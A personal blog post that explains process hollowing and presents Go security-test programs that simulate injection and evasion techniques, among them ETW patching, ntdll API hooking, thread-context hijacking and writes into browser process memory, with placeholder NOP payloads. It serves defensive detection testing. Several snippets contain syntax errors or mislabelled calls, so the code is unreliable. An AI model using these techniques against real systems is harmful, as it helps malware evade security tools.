---
title: "goPro: detecting process hollowing with Go"
date: 2024-08-12T14:25:48-05:00
draft: false
---

if you ever find yourself in between jobs for an extended period of time, remember to take time off from bouncing from constantly worrying to being completely nihilistic. if you can spare the time and energy, it can be quite rewarding to find something that you can totally nerd out on. for me, it was the world of windows malware.

this could probably benefit from being part of a series, so i'll keep the contents of this post focused on the title. windows is a vast and strange land, and its architecture is both extremely well-studied and mysterious. there's a lot we know, but also a lot we don't know. 

process hollowing, however, is quite well-documented. the inspiration behind this article and the code was [this](https://posts.specterops.io/lateral-movement-with-the-net-profiler-8772c86f9523) interesting piece by daniel mayer, where he uses the windows .NET profiler to pull over your payload and execute it. the offensive value is intriguing, and i'm sure we'll see more research in this area!

### what exactly is process hollowing?

#### **tl;dr**: 
process hollowing (aka [RunPE](https://github.com/aaaddress1/RunPE-In-Memory)) is a method of process injection. what happens is original code + resources of a target process are replaced or removed, leaving behind bare process framework. the hollowed process becomes a host for injected malicious code, which is executed under the guise of a legit process. 

the WinAPIs required for this are the usual suspects: `CreateProcess`, `NtUnmapViewOfSection`, `VirtualAllocEx`, `WriteProcessMemory`, `SetThreadContext`, `ResumeThread`. 

the attacker goes about this by launching a legit process (`notepad.exe` is a basic but popular choice) in a **suspended state**. this means the process is created but not executing any code. 

what happens next is the hollowing: unmapping or deallocating the memory that contains the original executable code of the suspended process. the legitimate "content" is removed, leaving an empty process structure.

if the tactic hasn't been detected by this point, the attacker would then inject their own malicious code into the hollowed-out process. this is usually done by allocating memory in the process's address space and copying the malicious code into the space.

when process hollowing is successful, it should appear that a legitimate process is running. in reality, the process is executing the injected malicious code.

### detecting process hollowing with Go

i was preparing for an interview with ${company}, and the topic of writing detections in Go had come up. i hadn't really written much Go at this point, so i thought it would be fun to learn enough about the language to eventually use it to write detection scripts. 

#### why Go, specifically?

Go is pretty well known for its performance and implementation of concurrency. process hollowing involves low-level operations on system processes, so being fast and efficient is crucial. the `goroutines` allow for concurrent operations, like monitoring/testing, without significant overhead (theoretically). 

a big plus is that Go supports cross-platform code, so the tests could technically be adapted for a different OS. the standard library is pretty robust, and provided me with a lot of built-in tools that i'd use for network communication, file I/O, and system interaction.

a lesser known (to me) advantage of Go is that its statically typed nature and compiled binaries help to create reliable and predictable behaviour. the binaries can be easily deployed without dependencies. 

i also had a lot of fun writing + testing the scripts, because of the memory safety of Go's design and smooth error handling.

#### `endpoint`

${company} discussed using a module called `endpoint`. essentially, it's a library that facilitates the creation and execution (and reporting) of security tests. it abstracts a lot of the complexities that would be involved when interacting with the system, and provided a consistent interface for performing and reporting on various operations.

i won't share the code here, but i think it's fair to discuss the key components at work, since the code is public and we'll be discussing the tests i wrote in support of it.

**start and stop functions**: manages the lifecycle of the tests (initialization to cleanup). the execution is kicked off with `Start(test fn, clean ...fn)` and stopped by `Stop(code int)`. 

these functions run the test in a separate `goroutine` (which allows for concurrent execution), implement a timeout mechanism, and make sure the test is cleaned up properly (after providing a status code that signals the end of the test).

**system interaction + process management**: this module is probably the most important, as it interacts with the OS for tasks like process creation, memory manipulation, and more.

`Shell(args []string) (string, error)` executes a shell command and returns its output. `Write(filename string, contents []byte) error` and `Read(path string) []byte` handle writing data and reading data to/from the filesystem. `Remove(path string) bool` deletes a file at the specified path (important for cleanup).

some more functions include `AES256GCMEncrypt(data []byte) ([]byte, []byte, error)` and `AES256GCMDecrypt(data, key []byte) ([]byte, error)`, which handle encryption; `startDropperChildProcess()` and `writeIPC()`, which start a child process ("dropper") and communicate with it via IPC, and more.

now, on to the tests!

### **call stack spoofing via synthetic frames**

**call stack spoofing** is an attack where the call stack is manipulated to make it appear as if a function was called by legitimate code. used to hide the origin of suspicious API calls, it makes tracing malicious behaviour more difficult.

this test attempts to detect when the call stack is artificially altered, which is often a sign of process hollowing (or ROP attacks). 

the test starts by creating a legitimate process (`notepad.exe`) as its target. it then allocates memory within the target process and writes a NOP slide as a stand-in for malicious shellcode. 

the key part of this test is `alterCallStack()`, where a trampoline function is used to alter the call stack. trampolines are used to change the execution flow ("jumping") to conceal the origin of a malicious call.

```go
func main() {
	Endpoint.Say("[+] Starting Call Stack Spoofing via Synthetic Frames [+]")
	Endpoint.Start(test, cleanup)
}

func test() {
	proc.Handle := windows.Handle(0)
	remoteProcHandle := windows.Handle(0)
	var err error

	// start process
	cmd := exec.Command("notepad.exe")
	err = cmd.Start()
	if err != nil {
		Endpoint.Say(fmt.Sprintf("failed to start process: %s", err))
		Endpoint.Stop(1) // ERROR
	}
	defer cmd.Process.Kill()

	// get process handle
	procHandle, err = windows.OpenProcess(windows.PROCESS_ALL_ACCESS, false, uint32(cmd.Process_Pid))
	if err != nil {
		Endpoint.Say(fmt.Sprintf("failed to get process handle: %s", err))
		Endpoint.Stop(1) // ERROR
	}

	// allocate memory to target process
	var remoteAddr uintptr
	remoteAddr, err = windows.VirtualAllocEx(procHandle, 0, 4096, windows.MEM_COMMIT, windows.PAGE_EXECUTE_READWRITE)
	if err != nil {
		Endpoint.Say(fmt.Sprintf("[-] Failed to allocate memory: %s", err))
		Endpoint.Stop(1) // ERROR
	}

	// write shellcode to allocated memory
	shellcode := []byte{0x90, 0x90, 0x90, 0x90} // NOP slide placeholder
	var written uint32
	err = windows.WriteProcessMemory(procHandle, remoteAddr, &shellcode[0], uint32(len(shellcode)), &written)
	if err != nil {
		Endpoint.Say(fmt.Sprintf("[-] Failed to write to process memory: %s", err))
		Endpoint.Stop(1) // ERROR
	}

	// create remote thread in target process
	var threadHandle windows.Handle
	threadHandle, err = windows.CreateRemoteThread(procHandle, nil, 0, remoteAddr, 0, 0, nil)
	if err != nil {
		Endpoint.Say(fmt.Sprintf("[-] Failed to create remote thread: %s", err))
		Endpoint.Stop(1) // ERROR
	}
	defer windows.CloseHandle(threadHandle)

	// alter call stack
	alterCallStack()
	Endpoint.Say("[+] Call stack spoofing executed successfully")
	Endpoint.Stop(101) // UNPROTECTED: Malicious behavior not blocked
}

func alterCallStack() {
	// altering stack using trampoline function
	trampoline := syscall.NewCallback(func() uintptr {
		// jump to real target func
		return 0
	})

	// allocate memory to trampoline func
	mem, err := windows.VirtualAlloc(0, 4096, windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
	if err != nil {
		Endpoint.Say(fmt.Sprintf("[-] Failed to allocate memory for trampoline: %s", err))
		Endpoint.Stop(1) // ERROR
	}

	// write trampoline to allocated memory
	trampolineAddr := (uintptr)(unsafe.Pointer(trampoline))
	trampolineSize := uintptr(unsafe.Sizeof(trampoline))
	copy((*(*[1 << 20]byte)(unsafe.Pointer(mem)))[:], (*(*[1 << 20]byte)(unsafe.Pointer(trampolineAddr)))[:trampolineSize])

	// call trampoline to alter call stack
	syscall.Syscall(trampolineAddr, 0, 0, 0, 0)
}

func cleanup() {
	Endpoint.Say("[+] Cleanup completed successfully")
	Endpoint.Stop(100) // PROTECTED
}
```

### **evasion via event tracing for windows patching**

**ETW patching** is when the Event Tracing for Windows (ETW) is disabled/modified. ETW is a key feature in Windows, used to log + trace events within the OS. by patching ETW, security tools can be prevented from logging malicious activity and attackers can evade detection.

the test first allocates memory within the target process and simulates patching ETW-related functions inside `ntdll.dll`. it replaces these functions with a simple `RET`, effectively disabling ETW logging for certain events. 

it also includes a verification step to ensure that the patch was applied successfully, indicating an attempt to disable ETW. 

```go
func main() {
	Endpoint.Say("[+] Starting Evasion via Event Tracing for Windows Patching [+]")
	Endpoint.Start(test, cleanup)
}

func test() {
	procHandle := windows.Handle(0)
	var err error

	// start process
	cmd := exec.Command("notepad.exe")
	err = cmd.Start()
	if err != nil {
		Endpoint.Say(fmt.Sprintf("[-] Failed to start process: %s", err))
		Endpoint.Stop(1) // ERROR
	}
	defer cmd.Process.Kill()

	// get process handle
	procHandle, err = windows.OpenProcess(windows.PROCESS_ALL_ACCESS, false, uint32(cmd.Process.Pid))
	if err != nil {
		Endpoint.Say(fmt.Sprintf("[-] Failed to get process handle: %s", err))
		Endpoint.Stop(1) // ERROR
	}

	// allocate memory in target
	var remoteAddr uintptr
	remoteAddr, err = windows.VirtualAllocEx(procHandle, 0, 4096, windows.MEM_COMMIT, windows.PAGE_EXECUTE_READWRITE)
	if err != nil {
		Endpoint.Say(fmt.Sprintf("[-] Failed to allocate memory: %s", err))
		Endpoint.Stop(1) // ERROR
	}

	// write dummy data to allocate memory [NOP slide to simulate patching]
	dummyData := []byte{0x90, 0x90, 0x90, 0x90}
	var written uint32
	err = windows.WriteProcessMemory(procHandle, remoteAddr, &dummyData[0], uint32(len(dummyData)), &written)
	if err != nil || written != uint32(len(dummyData)) {
		Endpoint.Say(fmt.Sprintf("[-] Failed to write to process memory: %s", err))
		Endpoint.Stop(1) // ERROR
	}
	// Verify the memory was patched
	verifyMemoryPatch(procHandle, remoteAddr, dummyData)

	// Attempt to patch ETW functions
	patchETW()

	Endpoint.Say("[+] ETW patching executed successfully")
	Endpoint.Stop(101) // UNPROTECTED: Malicious behavior not blocked

}

func patchETW() {
	// patching ETW functions in ntdll.dll
	ntdll := windows.NewLazySystemDLL("ntdll.dll")
	etwEventWrite := ntdll.NewProc("EtwEventWrite")

	// allocate memory for patch
	mem, err := windows.VirtualAlloc(0, 4096, windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
	if err != nil {
		Endpoint.Say(fmt.Sprintf("[-] Failed to allocate memory for ETW patch: %s", err))
		Endpoint.Stop(1) // ERROR
	}

	// write patch to memory
	patch := []byte{0xC3} // RET instruction to bypass function
	copy((*(*[1 << 20]byte)(unsafe.Pointer(mem)))[:], patch)

	// patch EtwEventWrite
	err = windows.WriteProcessMemory(windows.CurrentProcess(), etwEventWrite.Addr(), &patch[0], uintptr(len(patch)), nil)
	if err != nil {
		Endpoint.Say(fmt.Sprintf("[-] Failed to patch EtwEventWrite: %s", err))
		Endpoint.Stop(1) // ERROR
	}
}

func verifyMemoryPatch(procHandle windows.Handle, remoteAddr uintptr, expectedData []byte) {
	buffer := make([]byte, len(expectedData))
	var read uint32
	err := windows.ReadProcessMemory(procHandle, remoteAddr, &buffer[0], uint32(len(buffer)), &read)
	if err != nil || read != uint32(len(buffer)) || !compareBuffers(buffer, expectedData) {
		Endpoint.Say("[-] Memory patch verification failed")
		Endpoint.Stop(1) // ERROR
	}
	Endpoint.Say("[+] Memory patch verification succeeded")
}

func compareBuffers(buf1, buf2 []byte) bool {
	if len(buf1) != len(buf2) {
		return false
	}
	for i := range buf1 {
		if buf1[i] != buf2[i] {
			return false
		}
	}
	return true
}

func cleanup() {
	Endpoint.Say("[+] Cleanup completed successfully")
	Endpoint.Stop(100) // PROTECTED
}
```

### **remote thread context manipulation**

attackers can modify the execution context of a thread in a remote process, allowing them to execute arbitrary code within the process. this happens a lot with process injection attacks. 

the test first retrieves the context of the main thread of the target process and modifies its instruction pointer (`RIP`) to point to the address of injected shellcode. attackers can hijack threads to execute payloads this way.

by changing the thread's context, the test forces the process to execute the injected code, simulating the achievement of remote code execution.

```go
func main() {
	Endpoint.Say("[+] Starting Remote Thread Context Manipulation [+]")
	Endpoint.Start(test, cleanup)
}

func test() {
	// Start a target process to work with
	cmd := exec.Command("notepad.exe")
	err := cmd.Start()
	if err != nil {
		Endpoint.Say(fmt.Sprintf("[-] Failed to start process: %s", err))
		Endpoint.Stop(1) // ERROR
	}
	defer cmd.Process.Kill()

	// Get handle to the target process
	procHandle, err := windows.OpenProcess(windows.PROCESS_ALL_ACCESS, false, uint32(cmd.Process.Pid))
	if err != nil {
		Endpoint.Say(fmt.Sprintf("[-] Failed to get process handle: %s", err))
		Endpoint.Stop(1) // ERROR
	}

	// main thread of target proc
	threadHandle, err := getMainThreadHandle(cmd.Process.Pid)
	if err != nil {
		Endpoint.Say(fmt.Sprintf("[-] Failed to get main thread handle: %s", err))
		Endpoint.Stop(1) // ERROR
	}

	// manipulating thread context
	var context windows.Context
	context.ContextFlags = windows.CONTEXT_FULL
	err = windows.GetThreadContext(threadHandle, &context)
	if err != nil {
		Endpoint.Say(fmt.Sprintf("[-] Failed to get thread context: %s", err))
		Endpoint.Stop(1) // ERROR
	}

	// change thread context: change instruction pointer to shellcode address
	context.Rip = uintptr(unsafe.Pointer(&dummyShellcode[0]))
	err = windows.SetThreadContext(threadHandle, &context)
	if err != nil {
		Endpoint.Say(fmt.Sprintf("[-] Failed to set thread context: %s", err))
		Endpoint.Stop(1) // ERROR
	}

	Endpoint.Say("[+] Remote thread context manipulation executed successfully")
	Endpoint.Stop(101) // UNPROTECTED: Malicious behavior not blocked
}

func getMainThreadHandle(pid int) (windows.Handle, error) {
	var snapshot windows.Handle
	var entry windows.ThreadEntry32
	// take snapshot of specified processes
	// 
	snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPTHREAD, 0)
	if err != nil {
		return 0, err
	}
	defer windows.CloseHandle(snapshot)

	entry.Size = uint32(unsafe.Sizeof(entry))
	// retrieve info about first thread of process from snapshot
	err = windows.Thread32First(snapshot, &entry)
	if err != nil {
		return 0, err
	}

	for {
		if entry.OwnerProcessID == uint32(pid) {
			threadHandle, err := windows.OpenThread(windows.THREAD_ALL_ACCESS, false, entry.ThreadID)
			if err != nil {
				return 0, err
			}
			return threadHandle, nil
		}
		err = windows.Thread32Next(snapshot, &entry)
		if err != nil {
			break
		}
	}
	return 0, fmt.Errorf("no main thread found for process %d", pid)
}

var dummyShellcode = []byte {
	0x90, 0x90, 0x90, 0x90
}

func cleanup() {
	Endpoint.Say("[+] Cleanup completed successfully")
	Endpoint.Stop(100) // PROTECTED
}
```

### **suspicious windows NT API hooking**

**API hooking** is an attack where the behaviour of system APIs is intercepted and modified. by hooking APIs, attackers strive to alter the way system calls (syscalls) behave, usually to inject payloads or evade detection. hooking critical system APIs subverts normal system operations, and is used in a lot of attacks.

the test first hooks several sensitive NT APIs related to memory management and section mapping. this is done by writing a `JMP` instruction to redirect the API calls to a custom function, simulating how attackers might hijack the APIs.

the test then dynamically resolves the addresses of these APIs, which is crucial in identifying and hooking specific functions in a live system.

```go
var ntdll = windows.NewLazyDLL("ntdll.dll")

func main() {
	Endpoint.Say("[+] Starting Suspicious Windows NT API Hooking [+]")
	Endpoint.Start(test, cleanup)
}

func test() {
	// define NT API functions to hook
	hookAPIs := []string{
		"ZwCreateSection", "NtCreateSection", "ZwOpenSection", "NtOpenSection", "ZwClose", "NtClose", "ZwMapViewOfSection", "NtMapViewOfSection", "ZwUnmapViewOfSection", "NtUnmapViewOfSection",
	}

	// load ntdll + get addresses of APIs
	for _, api := range hookAPIs {
		proc := ntdll.NewProc(api)
		addr := proc.Addr()
		Endpoint.Say(fmt.Sprintf("[+] Address of %s: 0x%X", api, addr))
		// hook API by writing JMP instruction to custom function
		hookAPI(addr)
	}

	Endpoint.Say("hooked all specified NT APIs")
	Endpoint.Stop(101) // UNPROTECTED: Malicious behavior not blocked
}

func hookAPI(addr uintptr) {
	// JMP to custom function
	jmp := []byte{0xE9, 0x00, 0x00, 0x00, 0x00} // JMP rel32
	relAddr := uintptr(unsafe.Pointer(&customFunction)) - (addr + uintptr(len(jmp)))
	*(*uintptr)(unsafe.Pointer(&jmp[1])) = relAddr

	// write JMP to target API address
	var oldProtect uint32
	err := windows.VirtualProtect(addr, uintptr(len(jmp)), windows.PAGE_EXECUTE_READWRITE, &oldProtect)
	if err != nil {
		Endpoint.Say(fmt.Sprintf("[-] Failed to change memory protection: %s", err))
		Endpoint.Stop(1) // ERROR
	}
	_, err = windows.WriteProcessMemory(windows.CurrentProcess(), addr, &jmp[0], uintptr(len(jmp)), nil)
	if err != nil {
		Endpoint.Say(fmt.Sprintf("[-] Failed to write memory: %s", err))
		Endpoint.Stop(1) // ERROR
	}
	err = windows.VirtualProtect(addr, uintptr(len(jmp)), oldProtect, &oldProtect)
	if err != nil {
		Endpoint.Say(fmt.Sprintf("[-] Failed to restore memory protection: %s", err))
		Endpoint.Stop(1) // ERROR
	}
}

func customFunction() {
	// Custom function to be called by the hooked APIs
	Endpoint.Say("[+] Custom function called by hooked API")
}

func cleanup() {
	Endpoint.Say("[+] Cleanup completed successfully")
	Endpoint.Stop(100) // PROTECTED
}
```

### **.NET COM object creation in non-standard windows script interpreter**

attackers can create .NET COM objects from within non-standard script interpreters (like VBScript) to execute arbitrary Win32 APIs. scripting languages can be used to execute .NET code and used to achieve similar ends as a more conventional binary payload, which is easily detected. 

the test runs a VBScript that attempts to launch `notepad.exe`. attackers use a script to bootstrap the execution of more complex code.

then, the creation of a .NET COM object and the execution of shellcode within the context of the script is simulated.

```go
var scriptPath = "C:\\Windows\\Temp\\suspiciousScript.vbs"

func main() {
	Endpoint.Say("[+] Starting .NET COM object created in non-standard Windows Script Interpreter [+]")
	Endpoint.Start(test, cleanup)
}

func test() {
	// create new VBS script file
	scriptContent := `
	Set obj = CreateObject("WScript.Shell)
	obj.Run "notepad.exe"
	`
	err := os.WriteFile(scriptPath, []byte(scriptContent), 0644)
	if err != nil {
		Endpoint.Say(fmt.Sprintf("[-] Failed to create script file: %s", err))
		Endpoint.Stop(1) // ERROR
	}
	Endpoint.Say("[+] VBS script file created")

	// execute VBS script with wscript.exe
	cmd := exec.Command("wscript.exe", scriptPath)
	err = cmd.Start()
	if err != nil {
		Endpoint.Say(fmt.Sprintf("[-] Failed to execute script: %s", err))
		Endpoint.Stop(1) // ERROR
	}
	Endpoint.Say("[+] Script executed successfully")
	// Simulate .NET COM object creation and suspicious API call
	simulateDotNetCOMObjectCreation()

	Endpoint.Stop(101) // UNPROTECTED: Malicious behavior not blocked
}

func simulateDotNetCOMObjectCreation() {
	// Simulate the creation of a .NET COM object in an unexpected script interpreter

	// Allocate executable memory
	kernel32 := windows.NewLazyDLL("kernel32.dll")
	procVirtualAlloc := kernel32.NewProc("VirtualAlloc")
	addr, _, err := procVirtualAlloc.Call(0, uintptr(4096), windows.MEM_RESERVE|windows.MEM_COMMIT, windows.PAGE_EXECUTE_READWRITE)
	if addr == 0 {
		Endpoint.Say(fmt.Sprintf("[-] VirtualAlloc failed: %s", err))
		Endpoint.Stop(1) // ERROR
	}
	Endpoint.Say("[+] VirtualAlloc executed successfully")

	// Write shellcode to allocated memory
	shellcode := []byte{0x90, 0x90, 0x90, 0x90} // NOP instructions (for demonstration)
	procWriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
	processHandle, err := windows.GetCurrentProcess()
	if err != nil {
		Endpoint.Say(fmt.Sprintf("[-] Failed to get current process handle: %s", err))
		Endpoint.Stop(1) // ERROR
	}
	var written uintptr
	ret, _, err := procWriteProcessMemory.Call(uintptr(processHandle), addr, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)), uintptr(unsafe.Pointer(&written)))
	if ret == 0 {
		Endpoint.Say(fmt.Sprintf("[-] WriteProcessMemory failed: %s", err))
		Endpoint.Stop(1) // ERROR
	}
	Endpoint.Say("[+] WriteProcessMemory executed successfully")
}

func cleanup() {
	// Remove the created script file
	err := os.Remove(scriptPath)
	if err != nil {
		Endpoint.Say(fmt.Sprintf("[-] Failed to remove script file: %s", err))
		Endpoint.Stop(103) // Cleanup failed
	}
	Endpoint.Say("[+] Script file removed")

	Endpoint.Stop(100) // PROTECTED
}
```

### **potential browser exploit via fake RPC messages**

this is an attack where specially crafted RPC (Remote Procedure Call) messages are sent to exploit vulnerabilities in web browsers. this can be used to bypass CFG (Control Flow Guard) mitigations, which prevent execution of arbitrary code.

the test first launches several common web browsers and allocates memory in their address spaces. it then writes shellcode to this memory and attempts to execute it via manipulated RPC calls.

it simulates the CFG bypass by exploiting a vulnerability in RPC message handling, specifically `NdrServerCall2`, which has been used in irl exploits.

```go
func main() {
	Endpoint.Say("[+] Starting Potential Browser Exploit via Fake RPC Messages [+]")
	Endpoint.Start(test, cleanup)
}

func test() {
	browserProcesses := []string{"chrome.exe", "msedge.exe", "iexplore.exe", "brave.exe", "whale.exe", "browser.exe", "dragon.exe", "vivaldi.exe", "opera.exe", "seamonkey.exe", "safari.exe", "waterfox.exe"}
	for _, processName := range browserProcesses {
		cmd := exec.Command(processName)
		err := cmd.Start()
		if err != nil {
			Endpoint.Say(fmt.Sprintf("[-] Failed to start process %s: %s", processName, err))
			continue
		}
		defer cmd.Process.Kill()

		// memory manipulation with VirtualProtect + WriteProcessMemory
		procHandle, err := windows.OpenProcess(windows.PROCESS_ALL_ACCESS, false, uint32(cmd.Process.Pid))
		if err != nil {
			Endpoint.Say(fmt.Sprintf("[-] Failed to get process handle: %s", err))
			Endpoint.Stop(1) // ERROR
		}

		// allocate memory in target process
		addr, err := windows.VirtualAllocEx(procHandle, 0, 4096, windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
		if err != nil {
			Endpoint.Say(fmt.Sprintf("[-] Failed to allocate memory: %s", err))
			Endpoint.Stop(1) // ERROR
		}

		// write shellcode to allocated memory
		shellcode := []byte{0x90, 0x90, 0x90, 0x90} // NOP sled as a placeholder
		var written uint32
		err = windows.WriteProcessMemory(procHandle, addr, &shellcode[0], uint32(len(shellcode)), &written)
		if err != nil {
			Endpoint.Say(fmt.Sprintf("[-] Failed to write memory: %s", err))
			Endpoint.Stop(1) // ERROR
		}

		// change memory protection to EXECUTABLE
		oldProtect := windows.PAGE_READWRITE
		err = windows.VirtualProtectEx(procHandle, addr, 4096, windows.PAGE_EXECUTE_READ, &oldProtect)
		if err != nil {
			Endpoint.Say(fmt.Sprintf("[-] Failed to change memory protection: %s", err))
			Endpoint.Stop(1) // ERROR
		}

		// call NdrServerCall2
		// this component handles RPC requests + dispatches them to function pointers
		// has been exploited to bypass CFG
		// attacker replaced DOM vtable pointer with NdrServerCall2 -> bypassing CFG check
		_, err = syscall.GetProcAddress(windows.NewLazyDLL("rpcrt4.dll").Handle(), "NdrServerCall2")
		if err != nil {
			Endpoint.Say(fmt.Sprintf("[-] Failed to find NdrServerCall2: %s", err))
			Endpoint.Stop(1) // ERROR
		}
		Endpoint.Say("[+] Simulated RPC function call with memory manipulation")
	}
	Endpoint.Say("[+] Potential browser exploit via fake RPC messages executed successfully")
	Endpoint.Stop(101) // UNPROTECTED: Malicious behavior not blocked
}

func cleanup() {
	Endpoint.Say("[+] Cleanup completed successfully")
	Endpoint.Stop(100) // PROTECTED
}
```

### **suspicious API from an unsigned service DLL**

here, the attacker loads a malicious, unsigned DLL into a service process like `svchost.exe` (a critical system process), then uses that DLL to execute suspicious APIs. this is often used to maintain persistence or for privilege escalation.

the test creates an unsigned DLL and attempts to load it into `svchost.exe`. after loading the DLL, the test simulates suspicious API calls (`WriteProcessMemory`, `VirtualProtectEx`), which are usually used to modify the memory of other process or to change permissions on executable code.

```go
var serviceDLLPath = "C:\\Windows\\Temp\\suspicious.dll"

func main() {
	Endpoint.Say("[+] Starting Suspicious API from an Unsigned Service DLL [+]")
	Endpoint.Start(test, cleanup)
}

func test() {
	// create new unsigned DLL
	dllContent := []byte("test DLL file")
	err := os.WriteFile(serviceDLLPath, dllContent, 0644)
	if err != nil {
		Endpoint.Say(fmt.Sprintf("[-] Failed to create DLL file: %s", err))
		Endpoint.Stop(1) // ERROR
	}
	Endpoint.Say("[+] Unsigned DLL file created")

	// load DLL into svchost.exe
	cmd := exec.Command("rundll32.exe", serviceDLLPath+",ServiceMain")
	err = cmd.Start()
	if err != nil {
		Endpoint.Say(fmt.Sprintf("[-] Failed to load DLL into svchost.exe: %s", err))
		Endpoint.Stop(1) // ERROR
	}
	Endpoint.Say("[+] DLL loaded into svchost.exe")
	time.Sleep(3 * time.Second)
	// Simulate suspicious API calls
	simulateSuspiciousAPICalls()

	Endpoint.Stop(101) // UNPROTECTED: Malicious behavior not blocked
}

func simulateSuspiciousAPICalls() {
	// WriteProcessMemory call
	var kernel32 = windows.NewLazySystemDLL("kernel32.dll")
	var procWriteProcessMemory = kernel32.NewProc("WriteProcessMemory")
	processHandle, err := windows.OpenProcess(windows.PROCESS_ALL_ACCESS, false. uint32(os.Getpid()))
	if err != nil {
		Endpoint.Say(fmt.Sprintf("[-] Failed to open process: %s", err))
		Endpoint.Stop(1) // ERROR
	}
	var written uint32
	buffer := []byte("memorywrite")
	addr := uintptr(0x00000001)
	ret, _, err := procWriteProcessMemory.Call(uintptr(processHandle), addr, uintptr(unsafe.Pointer(&buffer[0])), uintptr(len(buffer)), uintptr(unsafe.Pointer(&written)))
	if ret == 0 {
		Endpoint.Say(fmt.Sprintf("[-] WriteProcessMemory failed: %s", err))
		Endpoint.Stop(1) // ERROR
	}
	Endpoint.Say("[+] WriteProcessMemory executed successfully")

	// Simulate VirtualProtectEx call
	var oldProtect uint32
	addr = uintptr(0x00000001)
	size := uintptr(1024)
	newProtect := uint32(windows.PAGE_EXECUTE_READWRITE)
	ret, _, err = syscall.Syscall6(procWriteProcessMemory.Addr(), 5, uintptr(processHandle), addr, size, uintptr(newProtect), uintptr(unsafe.Pointer(&oldProtect)), 0)
	if ret == 0 {
		Endpoint.Say(fmt.Sprintf("[-] VirtualProtectEx failed: %s", err))
		Endpoint.Stop(1) // ERROR
	}
	Endpoint.Say("[+] VirtualProtectEx executed successfully")
}
func cleanup() {
	// Remove the created DLL file
	err := os.Remove(serviceDLLPath)
	if err != nil {
		Endpoint.Say(fmt.Sprintf("[-] Failed to remove DLL file: %s", err))
		Endpoint.Stop(103) // Cleanup failed
	}
	Endpoint.Say("[+] DLL file removed")

	Endpoint.Stop(100) // PROTECTED
}
```

### **suspicious kernel mode address manipulation**

attackers try to modify memory in the kernel space from a user mode process, which is an obvious attempt at privilege escalation. manipulating kernel memory can allow attackers to gain **complete control** over the system.

the test attempts to allocate memory in a kernel mode address range, which is normally inaccessible to user mode processes. attackers do this to exploit a vulnerability that can allow them to write to or execute code in the kernel space.

the test then tries to change the memory protection on the allocated kernel mode memory.

```go
func main() {
	Endpoint.Say("[+] Starting Suspicious Kernel Mode Address Manipulation [+]")
	Endpoint.Start(test, cleanup)
}

func test() {
	// Attempt to allocate and modify memory in a kernel mode address range
	kernelAddress := uintptr(0x1000000000000) // Example kernel mode address
	size := uintptr(1024)                     // Memory size
	oldProtect := uint32(0)
	newProtect := windows.PAGE_EXECUTE_READWRITE

	// Allocate memory at the kernel mode address
	addr, err := windows.VirtualAlloc(kernelAddress, size, windows.MEM_COMMIT|windows.MEM_RESERVE, newProtect)
	if err != nil || addr != kernelAddress {
		Endpoint.Say(fmt.Sprintf("[-] Failed to allocate memory at kernel mode address: %s", err))
		Endpoint.Stop(1) // ERROR
	}
	Endpoint.Say("[+] Successfully allocated memory at kernel mode address")

	// Modify memory protection
	err = windows.VirtualProtect(kernelAddress, size, newProtect, &oldProtect)
	if err != nil {
		Endpoint.Say(fmt.Sprintf("[-] Failed to change memory protection at kernel mode address: %s", err))
		Endpoint.Stop(1) // ERROR
	}

	Endpoint.Say("[+] Successfully changed memory protection at kernel mode address")

	// Write to the kernel mode address
	data := []byte{0x90, 0x90, 0x90, 0x90} // NOP instructions
	written := uint32(0)
	err = windows.WriteProcessMemory(windows.CurrentProcess(), kernelAddress, &data[0], uintptr(len(data)), &written)
	if err != nil || written != uint32(len(data)) {
		Endpoint.Say(fmt.Sprintf("[-] Failed to write to kernel mode address: %s", err))
		Endpoint.Stop(1) // ERROR
	}
	Endpoint.Say("[+] Successfully wrote to kernel mode address")
	Endpoint.Stop(101) // UNPROTECTED: Malicious behavior not blocked
}
func cleanup() {
	Endpoint.Say("[+] Cleanup completed successfully")
	Endpoint.Stop(100) // PROTECTED
}
```

## conclusion

i wanted to write code that was much more than just "simple" scripts. i wanted to write comprehensive tools that would help uncover and understand the more sophisticated and insidious aspects of modern threats. testing for techniques like process hollowing, API hooking, and kernel memory manipulation can hopefully offer some technical and educational value to my peers in the field, as i myself have gleaned from their learning and experience over the years. 

happy hacking!